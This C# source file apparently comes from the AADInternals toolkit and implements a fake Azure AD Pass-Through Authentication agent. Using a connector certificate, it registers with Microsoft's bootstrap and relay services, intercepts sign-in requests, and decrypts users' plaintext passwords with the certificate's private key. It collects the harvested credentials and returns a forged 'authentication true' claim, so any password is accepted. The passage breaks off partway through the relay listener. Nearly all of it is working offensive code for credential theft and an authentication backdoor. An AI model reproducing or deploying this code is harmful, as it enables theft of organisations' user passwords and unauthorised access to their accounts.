using System;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Net.WebSockets;
using System.Threading;
using System.Security.Cryptography.X509Certificates;
using System.Threading.Tasks;
using System.Xml;
using System.Collections.Generic;
using System.Security.Cryptography;
using System.Web;
using System.Collections;


namespace AADInternals
{
    public class PTAAgent
    {
        // variables
        private string subscriptionId;
        private string connectorId;
        private string machineName;
        private X509Certificate2 certificate;
        private Hashtable status;


        private HttpClient client;

        public PTAAgent(X509Certificate Certificate, string MachineName)
        {
            // Initialise variables
            this.certificate = new X509Certificate2(Certificate);
            this.machineName = MachineName;
            this.status = Hashtable.Synchronized(new Hashtable());

            // Get the ids from the certificate
            this.subscriptionId = this.certificate.GetNameInfo(X509NameType.SimpleName, false);
            this.connectorId = new Guid((this.certificate).Extensions["1.3.6.1.4.1.311.82.1"].RawData).ToString();

            // Create the http client with authentication certificate
            HttpClientHandler handler = new HttpClientHandler();
            handler.ClientCertificates.Add(this.certificate);
            this.client = new HttpClient(handler);
        }

        public Hashtable GetStatus()
        {
            return this.status;
        }

        public void StartAgent()
        {
            // Get the bootstrap
            var result = GetBootstrapConfiguration();
            string bootStrap = result.Result;
            XmlDocument doc = new XmlDocument();
            doc.LoadXml(bootStrap);

            XmlNamespaceManager nsmgr = new XmlNamespaceManager(doc.NameTable);
            nsmgr.AddNamespace("a", "http://schemas.datacontract.org/2004/07/Microsoft.ApplicationProxy.Common.BootstrapDataModel");
            XmlNodeList endpoints = doc.SelectNodes("//a:SignalingListenerEndpointSettings", nsmgr);

            // Loop through the endpoints
            int n = 1;
            foreach (XmlNode endpoint in endpoints)
            {
                EndpointSettings es = new EndpointSettings();
                es.certificate = this.certificate;

                es.number = n++;
                es.isAvailable = endpoint.SelectSingleNode("a:IsAvailable", nsmgr).InnerText.Equals("true");
                es.name = endpoint.SelectSingleNode("a:Name", nsmgr).InnerText;
                es.domain = endpoint.SelectSingleNode("a:Domain", nsmgr).InnerText;
                es.nameSpace = endpoint.SelectSingleNode("a:Namespace", nsmgr).InnerText;
                es.reliableSessionEnabled = endpoint.SelectSingleNode("a:ReliableSessionEnabled", nsmgr).InnerText.Equals("true");
                es.scheme = endpoint.SelectSingleNode("a:Scheme", nsmgr).InnerText;
                es.servicePath = endpoint.SelectSingleNode("a:ServicePath", nsmgr).InnerText;
                es.sharedAccessKey = endpoint.SelectSingleNode("a:SharedAccessKey", nsmgr).InnerText;
                es.sharedAccessKeyName = endpoint.SelectSingleNode("a:SharedAccessKeyName", nsmgr).InnerText;

                Console.WriteLine("Connector {0} connecting to: {1}",es.number, es.nameSpace);

                Thread thread = new Thread(StartEndpointListener);
                Hashtable endpointParameters = new Hashtable();
                endpointParameters.Add("endpointsettings", es);
                endpointParameters.Add("status", status);
                thread.Start(endpointParameters);

            }
        }

        
        // Get the boot strap configuration
        public async Task<string> GetBootstrapConfiguration()
        {
            string body = string.Format(@"
                <BootstrapRequest xmlns=""http://schemas.datacontract.org/2004/07/Microsoft.ApplicationProxy.Common.SignalerDataModel"" xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"">
	                <AgentSdkVersion>1.5.1542.0</AgentSdkVersion>
	                <AgentVersion>1.5.1542.0</AgentVersion>
	                <BootstrapAddOnRequests i:nil=""true""/>
	                <BootstrapDataModelVersion>1.5.1542.0</BootstrapDataModelVersion>
	                <ConnectorId>{0}</ConnectorId>
	                <ConnectorVersion i:nil=""true""/>
	                <ConsecutiveFailures>0</ConsecutiveFailures>
	                <CurrentProxyPortResponseMode>Primary</CurrentProxyPortResponseMode>
	                <FailedRequestMetrics xmlns:a=""http://schemas.datacontract.org/2004/07/Microsoft.ApplicationProxy.Common.BootstrapDataModel""/>
	                <InitialBootstrap>true</InitialBootstrap>
	                <IsProxyPortResponseFallbackDisabledFromRegistry>true</IsProxyPortResponseFallbackDisabledFromRegistry>
	                <LatestDotNetVersionInstalled>461814</LatestDotNetVersionInstalled>
	                <MachineName>{1}</MachineName>
	                <OperatingSystemLanguage>1033</OperatingSystemLanguage>
	                <OperatingSystemLocale>040b</OperatingSystemLocale>
	                <OperatingSystemSKU>7</OperatingSystemSKU>
	                <OperatingSystemVersion>10.0.17763</OperatingSystemVersion>
	                <ProxyDataModelVersion>1.5.1542.0</ProxyDataModelVersion>
	                <RequestId>{2}</RequestId>
	                <SubscriptionId>{3}</SubscriptionId>
	                <SuccessRequestMetrics xmlns:a=""http://schemas.datacontract.org/2004/07/Microsoft.ApplicationProxy.Common.BootstrapDataModel""/>
	                <TriggerErrors/>
	                <UpdaterStatus>Running</UpdaterStatus>
	                <UseServiceBusTcpConnectivityMode>false</UseServiceBusTcpConnectivityMode>
	                <UseSpnegoAuthentication>false</UseSpnegoAuthentication>
                </BootstrapRequest>",this.connectorId, this.machineName, Guid.NewGuid().ToString(),subscriptionId);

            string url = string.Format("https://{0}.bootstrap.msappproxy.net/ConnectorBootstrap", this.subscriptionId);

            HttpContent content = new StringContent(body, Encoding.UTF8, "application/xml");
            HttpResponseMessage response = await client.PostAsync(url, content);

            string responseBody = await response.Content.ReadAsStringAsync();

            return responseBody;
        }
        
        private static byte[] CreateRelayConnectionMessage(string connectionId, string nameSpace)
        {
            byte[] relayConnectionBytes = Encoding.UTF8.GetBytes(string.Format("RelayConnection_{0}", connectionId));
            byte[] hostBytes = Encoding.UTF8.GetBytes(string.Format("{0}-relay.servicebus.windows.net", nameSpace));
            List<byte> lBody = new List<byte>();
            lBody.AddRange(new byte[] { 0x0A, 0xA1 });
            lBody.Add((byte)relayConnectionBytes.Length);
            lBody.AddRange(relayConnectionBytes);
            lBody.Add(0xA1);
            lBody.Add((byte)hostBytes.Length);
            lBody.AddRange(hostBytes);
            lBody.AddRange(new byte[] { 0x70, 0x00, 0x01, 0x00, 0x00, 0x60, 0x1F, 0xFF, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40 });

            List<byte> lHeader = new List<byte>();
            lHeader.AddRange(new byte[] { 0x00, 0x00, 0x00 });
            lHeader.Add((byte)(9 + lBody.Count + 4));
            lHeader.AddRange(new byte[] { 0x02, 0x00, 0x00, 0x00, 0x00, 0x53, 0x10, 0xC0 });
            lHeader.Add((byte)lBody.Count);

            List<byte> lMessage = new List<byte>();
            lMessage.AddRange(lHeader.ToArray());
            lMessage.AddRange(lBody.ToArray());

            return lMessage.ToArray();
        }

        private static Credentials DecodePTACredential(string AuthRequest, X509Certificate2 Certificate)
        {
            // Extract the connector Id from the certificate
            string connectorId = new Guid((Certificate).Extensions["1.3.6.1.4.1.311.82.1"].RawData).ToString();
            Credentials credentials = new Credentials();

            // Parse the json
            string json = AuthRequest;

            int p = json.IndexOf("EncryptedData");
            int s = json.IndexOf("[", p); // [
            int e = json.IndexOf("]", p); // ]

            p = s + 1;
            while (p < e - 1)
            {
                int e2 = json.IndexOf("}", p);
                int l = e2 - p;
                string dataEntry = json.Substring(p + 1, l - 1);
                string[] data = dataEntry.Split(',');

                string key = data[2].Split(':')[1].Trim();
                key = key.Substring(1, key.Length - 2);
                string encData = data[1].Split(':')[1].Trim();
                encData = encData.Substring(1, encData.Length - 2).Replace("\\/", "/");

                // Check whether we had a correct certificate
                if (connectorId.Equals(key.Split('_')[0]))
                {
                    // Now try to decrypt
                    byte[] encryptedData = Convert.FromBase64String(encData);
                    byte[] decryptedData = ((RSACryptoServiceProvider)new X509Certificate2(Certificate).PrivateKey).Decrypt(encryptedData, true);
                    string password = Encoding.UTF8.GetString(decryptedData);

                    password = password.Substring(password.IndexOf(":") + 2);
                    password = password.Substring(0, password.Length - 2);
                    password = System.Text.RegularExpressions.Regex.Unescape(password);

                    credentials.password = password;
                }

                p = e2 + 1;
            }

            // Extract the username
            string userName = json.Substring(json.IndexOf(':', json.IndexOf("UserPrincipalName")));
            userName = userName.Substring(2, userName.Length - 6);
            credentials.userName = userName;
            
            return credentials;
        }

        private static string GetSASToken(string url, string key, string keyName)
        {
            // Create the HMAC object
            byte[] keyBytes = Encoding.UTF8.GetBytes(key);
            HMAC hmac = new HMACSHA256(keyBytes);

            // Convert expiry date to unix time
            var expires = (new DateTime()).AddDays(1);
            string exp = string.Format("{0}", (UInt32)(((DateTimeOffset)expires).ToUniversalTime()).ToUnixTimeSeconds());

            // Form the string to be signed
            string nameSpace = url.Split('/')[2];
            string urlToSign = string.Format("{0}\n{1}",HttpUtility.UrlEncode(url), exp);
            byte[] byteUrl = Encoding.UTF8.GetBytes(urlToSign);

            // Calculate the signature
            byte[] byteHash = hmac.ComputeHash(byteUrl);
            string signature = Convert.ToBase64String(byteHash);

            // Form the token
            string SASToken = string.Format("SharedAccessSignature sr={0}&sig={1}&se={2}&skn={3}", HttpUtility.UrlEncode(url), HttpUtility.UrlEncode(signature),exp,keyName);

            return SASToken;
        }

        private static byte[] CreateLinkMessage(EndpointSettings settings, string relayLinkId, string trackingId, string direction)
        {
            // Define some variables
            string link = string.Format("RelayLink_{0}:{1}", relayLinkId, direction);
            string sbUrl = string.Format("sb://{0}.servicebus.windows.net/{1}/", settings.nameSpace,settings.servicePath);
            string sasUrl = string.Format("http://{0}.servicebus.windows.net/{1}/", settings.nameSpace, settings.servicePath);
            string sas = GetSASToken(sasUrl, settings.sharedAccessKey, settings.sharedAccessKeyName);

            string swt = "com.microsoft:swt";
            string client = "com.microsoft:client-agent";
            string svbus = "ServiceBus/3.0.51093.14;";
            string dynrel = "com.microsoft:dynamic-relay";
            string listener = "com.microsoft:listener-type";
            string relcon = "RelayedConnection";
            string trackId = "com.microsoft:tracking-id";

            // Construct the message
            List<byte> lBody = new List<byte>();
            lBody.AddRange(new byte[] { 0x00, 0x00, 0x00, 0x0E, 0xA1 });
            lBody.Add((byte)link.Length);
            lBody.AddRange(Encoding.UTF8.GetBytes(link));
            
            // Some fixed bytes - may mean something or not
            if (direction.Equals("out"))
            {
                lBody.AddRange(new byte[] { 0x43, 0x42, 0x40, 0x40, 0x00, 0x53, 0x28, 0xC0, 0x0C, 0x0B, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x00, 0x53, 0x29, 0xC0, 0x7E, 0x07 });
            }
            else
            {
                lBody.AddRange(new byte[] { 0x52, 0x01, 0x41, 0x40, 0x40, 0x00, 0x53, 0x28, 0xC0, 0x82, 0x0B });
            }
            lBody.Add(0xA1);
            lBody.Add((byte)sbUrl.Length);
            lBody.AddRange(Encoding.UTF8.GetBytes(sbUrl));

            // Null values (0x40) and some other stuff
            if (direction.Equals("out"))
            {
                lBody.AddRange(new byte[] { 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0xD1, 0x00, 0x00, 0x01, 0xC9, 0x00, 0x00, 0x00, 0x0A });
            }
            else
            {
                lBody.AddRange(new byte[] { 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x00, 0x53, 0x29, 0xC0, 0x08, 0x07, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0xD1, 0x00, 0x00, 0x01, 0xC9, 0x00, 0x00, 0x00, 0x0A });
            }

            lBody.Add(0xA3); // symbol (utf8 string)
            lBody.Add((byte)swt.Length);
            lBody.AddRange(Encoding.UTF8.GetBytes(swt));
            lBody.Add(0xA1); // value (utf8 string)
            lBody.Add((byte)sas.Length);
            lBody.AddRange(Encoding.UTF8.GetBytes(sas));

            lBody.Add(0xA3); // symbol (utf8 string)
            lBody.Add((byte)client.Length);
            lBody.AddRange(Encoding.UTF8.GetBytes(client));
            lBody.Add(0xA1); // value (utf8 string)
            lBody.Add((byte)svbus.Length);
            lBody.AddRange(Encoding.UTF8.GetBytes(svbus));

            lBody.Add(0xA3); // symbol (utf8 string)
            lBody.Add((byte)dynrel.Length);
            lBody.AddRange(Encoding.UTF8.GetBytes(dynrel));

            lBody.Add(0x42); // Don't know what this is -> ascii for "B"

            lBody.Add(0xA3); // symbol (utf8 string)
            lBody.Add((byte)listener.Length);
            lBody.AddRange(Encoding.UTF8.GetBytes(listener));
            lBody.Add(0xA1); // value (utf8 string)
            lBody.Add((byte)relcon.Length);
            lBody.AddRange(Encoding.UTF8.GetBytes(relcon));

            lBody.Add(0xA3); // symbol (utf8 string)
            lBody.Add((byte)trackId.Length);
            lBody.AddRange(Encoding.UTF8.GetBytes(trackId));
            lBody.Add(0xA1); // value (utf8 string)
            lBody.Add((byte)trackingId.Length);
            lBody.AddRange(Encoding.UTF8.GetBytes(trackingId));

            // Calculate lengths
            byte[] msgLength =  BitConverter.GetBytes(lBody.Count);
            byte[] totalLength = BitConverter.GetBytes(lBody.Count + 16);
            Array.Reverse(msgLength);
            Array.Reverse(totalLength);

            // Construct the final message
            List<byte> lMessage = new List<byte>();
            lMessage.AddRange(totalLength);
            lMessage.AddRange(new byte[] { 0x02, 0x00, 0x00, 0x00, 0x00, 0x53, 0x12, 0xD0 });
            lMessage.AddRange(msgLength);
            lMessage.AddRange(lBody.ToArray());

            return lMessage.ToArray();
        }

        // Starts the proxy listener
        private static async void StartProxyListener(object proxyParameters)
        {
            Hashtable parameters = (Hashtable)proxyParameters;
            ProxySettings settings = (ProxySettings)parameters["proxysettings"];
            Hashtable status = (Hashtable)parameters["status"];

            // Build the url
            string url = string.Format("wss://{0}/subscriber/websocketconnect?requestId={1}", settings.url, Guid.NewGuid().ToString());

            // Create a socket and connect to it
            ClientWebSocket socket = new ClientWebSocket();

            try
            {
                socket.Options.ClientCertificates.Add(settings.certificate);

                socket.Options.SetRequestHeader("x-cwap-dnscachelookup-result", "NotUsed");
                socket.Options.SetRequestHeader("x-cwap-connector-usesdefaultproxy", "InUse");
                socket.Options.SetRequestHeader("x-cwap-connector-version", "1.5.1542.0");
                socket.Options.SetRequestHeader("x-cwap-datamodel-version", "1.5.1542.0");
                socket.Options.SetRequestHeader("x-cwap-connector-sp-connections", "0");
                socket.Options.SetRequestHeader("x-cwap-transid", settings.transId);
                CancellationToken token = new CancellationToken();

                var connection = socket.ConnectAsync(new Uri(url), token);
                while (!connection.IsCompleted) { Thread.Sleep(100); };
                if (connection.IsFaulted.Equals("true"))
                {
                    Console.WriteLine("ProxyListener failed to connect to {0}", settings.url);
                    return;
                }

                //Console.WriteLine("Connected to proxy {0}", settings.url);

                // Send the connection id message
                string connectionIdMessage = string.Format("{{\"ConnectionId\":\"{0}\",\"MessageType\":0}}", settings.connectionId);
                SendToSocket(socket, token, Encoding.UTF8.GetBytes(connectionIdMessage));

                // Define the user claim
                List<string> claims = new List<string>();
                // Success
                claims.Add(@"[{""ClaimType"":""http:\/\/schemas.xmlsoap.org\/ws\/2005\/05\/identity\/claims\/authentication"",""Resource"":true,""Right"":""http:\/\/schemas.xmlsoap.org\/ws\/2005\/05\/identity\/right\/identity""},{""ClaimType"":""http:\/\/schemas.xmlsoap.org\/ws\/2005\/05\/identity\/claims\/name"",""Resource"":""anyone@anydomain"",""Right"":""http:\/\/schemas.xmlsoap.org\/ws\/2005\/05\/identity\/right\/identity""}]");
                // EncryptionDataNotFound
                claims.Add(@"[{""ClaimType"":""http:\/\/schemas.xmlsoap.org\/ws\/2005\/05\/identity\/claims\/authentication"",""Resource"":false,""Right"":""http:\/\/schemas.xmlsoap.org\/ws\/2005\/05\/identity\/right\/identity""},{""ClaimType"":""http:\/\/msappproxy.net\/ws\/2015\/02\/identity\/claims\/validationfailurereasoning"",""Resource"":""EncryptionDataNotFound"",""Right"":""http:\/\/schemas.xmlsoap.org\/ws\/2005\/05\/identity\/right\/identity""}]");
                // 1326: The user name or password is incorrect
                claims.Add(@"[{""ClaimType"":""http:\/\/schemas.xmlsoap.org\/ws\/2005\/05\/identity\/claims\/authentication"",""Resource"":false,""Right"":""http:\/\/schemas.xmlsoap.org\/ws\/2005\/05\/identity\/right\/identity""},{""ClaimType"":""http:\/\/msappproxy.net\/ws\/2015\/02\/identity\/claims\/validationfailurereasoning"",""Resource"":""1326"",""Right"":""http:\/\/schemas.xmlsoap.org\/ws\/2005\/05\/identity\/right\/identity""}]");
                // 1327: Account restrictions are preventing this user from signing in. For example: blank passwords aren't allowed, sign-in times are limited , or a policy restriction has been enforced.
                claims.Add(@"[{""ClaimType"":""http:\/\/schemas.xmlsoap.org\/ws\/2005\/05\/identity\/claims\/authentication"",""Resource"":false,""Right"":""http:\/\/schemas.xmlsoap.org\/ws\/2005\/05\/identity\/right\/identity""},{""ClaimType"":""http:\/\/msappproxy.net\/ws\/2015\/02\/identity\/claims\/validationfailurereasoning"",""Resource"":""1327"",""Right"":""http:\/\/schemas.xmlsoap.org\/ws\/2005\/05\/identity\/right\/identity""}]");
                // 1328: Your account has time restrictions that keep you from signing in right now
                claims.Add(@"[{""ClaimType"":""http:\/\/schemas.xmlsoap.org\/ws\/2005\/05\/identity\/claims\/authentication"",""Resource"":false,""Right"":""http:\/\/schemas.xmlsoap.org\/ws\/2005\/05\/identity\/right\/identity""},{""ClaimType"":""http:\/\/msappproxy.net\/ws\/2015\/02\/identity\/claims\/validationfailurereasoning"",""Resource"":""1328"",""Right"":""http:\/\/schemas.xmlsoap.org\/ws\/2005\/05\/identity\/right\/identity""}]");
                // 1329: This user isn't allowed to sign in to this computer
                claims.Add(@"[{""ClaimType"":""http:\/\/schemas.xmlsoap.org\/ws\/2005\/05\/identity\/claims\/authentication"",""Resource"":false,""Right"":""http:\/\/schemas.xmlsoap.org\/ws\/2005\/05\/identity\/right\/identity""},{""ClaimType"":""http:\/\/msappproxy.net\/ws\/2015\/02\/identity\/claims\/validationfailurereasoning"",""Resource"":""1329"",""Right"":""http:\/\/schemas.xmlsoap.org\/ws\/2005\/05\/identity\/right\/identity""}]");
                // 1330: The password for this account has expired.
                claims.Add(@"[{""ClaimType"":""http:\/\/schemas.xmlsoap.org\/ws\/2005\/05\/identity\/claims\/authentication"",""Resource"":false,""Right"":""http:\/\/schemas.xmlsoap.org\/ws\/2005\/05\/identity\/right\/identity""},{""ClaimType"":""http:\/\/msappproxy.net\/ws\/2015\/02\/identity\/claims\/validationfailurereasoning"",""Resource"":""1330"",""Right"":""http:\/\/schemas.xmlsoap.org\/ws\/2005\/05\/identity\/right\/identity""}]");
                // 1331: This user can't sign in because this account is currently disabled.
                claims.Add(@"[{""ClaimType"":""http:\/\/schemas.xmlsoap.org\/ws\/2005\/05\/identity\/claims\/authentication"",""Resource"":false,""Right"":""http:\/\/schemas.xmlsoap.org\/ws\/2005\/05\/identity\/right\/identity""},{""ClaimType"":""http:\/\/msappproxy.net\/ws\/2015\/02\/identity\/claims\/validationfailurereasoning"",""Resource"":""1331"",""Right"":""http:\/\/schemas.xmlsoap.org\/ws\/2005\/05\/identity\/right\/identity""}]");
                // 1311: Domain not available
                claims.Add(@"[{""ClaimType"":""http:\/\/schemas.xmlsoap.org\/ws\/2005\/05\/identity\/claims\/authentication"",""Resource"":false,""Right"":""http:\/\/schemas.xmlsoap.org\/ws\/2005\/05\/identity\/right\/identity""},{""ClaimType"":""http:\/\/msappproxy.net\/ws\/2015\/02\/identity\/claims\/validationfailurereasoning"",""Resource"":""1311"",""Right"":""http:\/\/schemas.xmlsoap.org\/ws\/2005\/05\/identity\/right\/identity""}]");
                // 1317: The specified account does not exist
                claims.Add(@"[{""ClaimType"":""http:\/\/schemas.xmlsoap.org\/ws\/2005\/05\/identity\/claims\/authentication"",""Resource"":false,""Right"":""http:\/\/schemas.xmlsoap.org\/ws\/2005\/05\/identity\/right\/identity""},{""ClaimType"":""http:\/\/msappproxy.net\/ws\/2015\/02\/identity\/claims\/validationfailurereasoning"",""Resource"":""1317"",""Right"":""http:\/\/schemas.xmlsoap.org\/ws\/2005\/05\/identity\/right\/identity""}]");


                url = string.Format("https://{0}/subscriber/connection?requestId={1}", settings.url, Guid.NewGuid().ToString());

                // Create the http client with certificate auth
                HttpClientHandler handler = new HttpClientHandler();
                handler.ClientCertificates.Add(settings.certificate);
                HttpClient client = new HttpClient(handler);

                client.DefaultRequestHeaders.Add("x-cwap-dnscachelookup-result", "NotUsed");
                client.DefaultRequestHeaders.Add("x-cwap-connector-usesdefaultproxy", "InUse");
                client.DefaultRequestHeaders.Add("x-cwap-connector-version", "1.5.1542.0");
                client.DefaultRequestHeaders.Add("x-cwap-datamodel-version", "1.5.1542.0");
                client.DefaultRequestHeaders.Add("x-cwap-connector-sp-connections", "1");
                client.DefaultRequestHeaders.Add("x-cwap-transid", settings.transId);
                client.DefaultRequestHeaders.Add("x-cwap-sessionid", "00000000-0000-0000-0000-000000000000");
                client.DefaultRequestHeaders.Add("x-cwap-certificate-authentication", "notProcessed");
                client.DefaultRequestHeaders.Add("x-cwap-headers-size", "0");
                client.DefaultRequestHeaders.Add("x-cwap-connector-be-latency-ms", "27");
                client.DefaultRequestHeaders.Add("x-cwap-payload-total-attempts", "0");
                client.DefaultRequestHeaders.Add("x-cwap-connector-loadfactor", "0");
                client.DefaultRequestHeaders.Add("x-cwap-response-total-attempts", "1");
                client.DefaultRequestHeaders.Add("x-cwap-connector-all-latency-ms", "70");

                // Loop
                while (socket.State == WebSocketState.Open)
                {
                    // Add the random claim, just for fun :D
                    //string userClaim = claims[new Random().Next(0,claims.Count-1)];
                    string userClaim = claims[0];
                    client.DefaultRequestHeaders.Add("x-cwap-backend-response", Convert.ToBase64String(Encoding.UTF8.GetBytes(userClaim)));

                    byte[] response = ReadFromSocket(socket, token, 2048);
                    string authRequest = Encoding.UTF8.GetString(response);

                    Credentials cred = DecodePTACredential(authRequest, settings.certificate);

                    List<Credentials> creds = (List<Credentials>)status[settings.url];
                    if (creds == null)
                    {
                        creds = new List<Credentials>();
                    }
                    creds.Add(cred);

                    status[settings.url] = creds;

                    try
                    {
                        await client.PostAsync(url, null);
                    }
                    catch
                    {
                        //Console.WriteLine("Oops, that didn't work :(");
                    }

                    // Close the socket
                    await socket.CloseAsync(System.Net.WebSockets.WebSocketCloseStatus.NormalClosure,"",token);
                }
            }
            catch { }
            finally
            {
                socket.Dispose();
            }
        }
        // Starts the relay listener
        private static void StartRelayListener(object relayParameters)
        {
            Hashtable parameters = (Hashtable)relayParameters;
            RelaySettings settings = (RelaySettings)parameters["relaysettings"];
            Hashtable status = (Hashtable)parameters["status"];

            Hashtable proxies = new Hashtable();

            // Build the url
            string url = string.Format("wss://{0}/{1}servicebus/websocket", settings.hostName, '\x0024');

            // Create a socket and connect to it
            ClientWebSocket socket = new ClientWebSocket();

            // Sleep for a while
            Thread.Sleep(new Random().Next(100,200));

            try
            {
                socket.Options.ClientCertificates.Add(settings.certificate);
                socket.Options.AddSubProtocol("wsrelayedconnection");
                CancellationToken token = new CancellationToken();

                var connection = socket.ConnectAsync(new Uri(url), token);
                while (!connection.IsCompleted) { Thread.Sleep(100); };
                if (connection.IsFaulted.Equals("true"))
                {
                    Console.WriteLine("RelayListener failed to connect to {0}", settings.hostName);
                    return;
                }

                // Step 1: Send "I'm a live!"
                byte[] message = { 0x1E, 0X01, 0X00, 0X00 };
                SendToSocket(socket, token, message);

                // Step 2: Send RelayedAccept 
                List<byte> lMessage = new List<byte>();
                lMessage.AddRange(new byte[] { 0x56, 0x02, 0x0B, 0x01, 0x73, 0x04, 0x0B, 0x01, 0x61, 0x06, 0x56, 0x08, 0x44, 0x0A, 0x1E, 0x00, 0x82, 0x99, 0x0D, 0x52, 0x65, 0x6C, 0x61, 0x79, 0x65, 0x64, 0x41, 0x63, 0x63, 0x65, 0x70, 0x74, 0x44, 0x0C, 0x1E, 0x00, 0x82, 0x99, 0x46, 0x68, 0x74, 0x74, 0x70, 0x3A, 0x2F, 0x2F, 0x73, 0x63, 0x68, 0x65, 0x6D, 0x61, 0x73, 0x2E, 0x6D, 0x69, 0x63, 0x72, 0x6F, 0x73, 0x6F, 0x66, 0x74, 0x2E, 0x63, 0x6F, 0x6D, 0x2F, 0x32, 0x30, 0x30, 0x35, 0x2F, 0x31, 0x32, 0x2F, 0x53, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65, 0x4D, 0x6F, 0x64, 0x65, 0x6C, 0x2F, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x69, 0x6E, 0x67, 0x2F, 0x41, 0x6E, 0x6F, 0x6E, 0x79, 0x6D, 0x6F, 0x75, 0x73, 0x01, 0x56, 0x0E, 0x40, 0x0D, 0x52, 0x65, 0x6C, 0x61, 0x79, 0x65, 0x64, 0x41, 0x63, 0x63, 0x65, 0x70, 0x74, 0x08, 0x43, 0x68, 0x74, 0x74, 0x70, 0x3A, 0x2F, 0x2F, 0x73, 0x63, 0x68, 0x65, 0x6D, 0x61, 0x73, 0x2E, 0x6D, 0x69, 0x63, 0x72, 0x6F, 0x73, 0x6F, 0x66, 0x74, 0x2E, 0x63, 0x6F, 0x6D, 0x2F, 0x6E, 0x65, 0x74, 0x73, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65, 0x73, 0x2F, 0x32, 0x30, 0x30, 0x39, 0x2F, 0x30, 0x35, 0x2F, 0x73, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65, 0x62, 0x75, 0x73, 0x2F, 0x63, 0x6F, 0x6E, 0x6E, 0x65, 0x63, 0x74, 0x09, 0x01, 0x69, 0x29, 0x68, 0x74, 0x74, 0x70, 0x3A, 0x2F, 0x2F, 0x77, 0x77, 0x77, 0x2E, 0x77, 0x33, 0x2E, 0x6F, 0x72, 0x67, 0x2F, 0x32, 0x30, 0x30, 0x31, 0x2F, 0x58, 0x4D, 0x4C, 0x53, 0x63, 0x68, 0x65, 0x6D, 0x61, 0x2D, 0x69, 0x6E, 0x73, 0x74, 0x61, 0x6E, 0x63, 0x65, 0x40, 0x02, 0x49, 0x64, 0x99, 0x24 });
                lMessage.AddRange(Encoding.UTF8.GetBytes(settings.relayId));
                lMessage.AddRange(new byte[] { 0x01, 0x01, 0x01 });
                SendToSocket(socket, token, lMessage.ToArray());

                // Step 3: Receive "Okay, thanks" 0x98 0x00 0x00 0x00
                ReadFromSocket(socket, token, 256);

                // Step 4: Receive RelayedAcceptReply
                //ReadFromSocket(socket, token, 256);

                // Loop
                byte[] sbUrl=null;
                string proxyUrl;
                string transId;
                string connectionId;
                byte[] id1 = new byte[16];
                byte[] seqId = new byte[16];
                byte[] id2 = new byte[16];
                byte[] conId = Guid.NewGuid().ToByteArray();

                while (socket.State == WebSocketState.Open)
                {
                    // Read the message and see what it is

                    byte[] response = ReadFromSocket(socket, token, 2048);

                    // Something went wrong :(
                    if (response == null)
                    {
                        Console.WriteLine("{0} response was null :(", settings.hostName);
                        break;
                    }

                    //Console.WriteLine("{0} response length: {1}",settings.hostName, response.Length);
                    // tempuri.org message
                    if (response.Length > 630)
                    {
                        int idPos = 59;
                        if(response.Length > 1000)
                        {
                            idPos = 684;
                        }
                        // Step 9: receive the tempuri.org message
                        //response = ReadFromSocket(socket, token, 2048);
                        
                        Array.Copy(response, idPos, id2, 0, 16);

                        // Parse stings (10)
                        List<string> lStrings = new List<string>();
                        int found = 1;
                        for (int a = response.Length - 1; a > 0 & found < 10; a--)
                        {
                            if (response[a] == 0x99)
                            {
                                // Get length byte
                                int l = response[a + 1];
                                lStrings.Add(Encoding.UTF8.GetString(response, a + 2, l));
                                found++;
                            }
                        }

                        proxyUrl = lStrings[4];
                        transId = lStrings[2];
                        connectionId = lStrings[0];

                        Console.WriteLine("{0} transId: {1}", settings.hostName, transId);

                        // Step 10: send some response
                        lMessage = new List<byte>();
                        lMessage.AddRange(new byte[] { 0x06, 0x55, 0x00, 0x56, 0x02, 0x0B, 0x01, 0x73, 0x04, 0x0B, 0x01, 0x72, 0x20, 0x0B, 0x01, 0x61, 0x06, 0x56, 0x08, 0x55, 0x2E, 0x55, 0x1E, 0xAD });
                        lMessage.AddRange(conId);
                        lMessage.AddRange(new byte[] { 0x55, 0x30, 0x06, 0x34, 0x82, 0x06, 0x32, 0x82, 0x01, 0x43, 0x05, 0x6E, 0x65, 0x74, 0x72, 0x6D, 0x36, 0x0B, 0x05, 0x6E, 0x65, 0x74, 0x72, 0x6D, 0x38, 0x89, 0x08, 0x01, 0x44, 0x0A, 0x1E, 0x00, 0x82, 0xAB, 0x3A, 0x44, 0x0C, 0x1E, 0x00, 0x82, 0xAB, 0x14, 0x01, 0x56, 0x0E, 0x01, 0x01 });
                        SendToSocket(socket, token, lMessage.ToArray());

                        // Step 11: send tempuri reply
                        lMessage = new List<byte>();
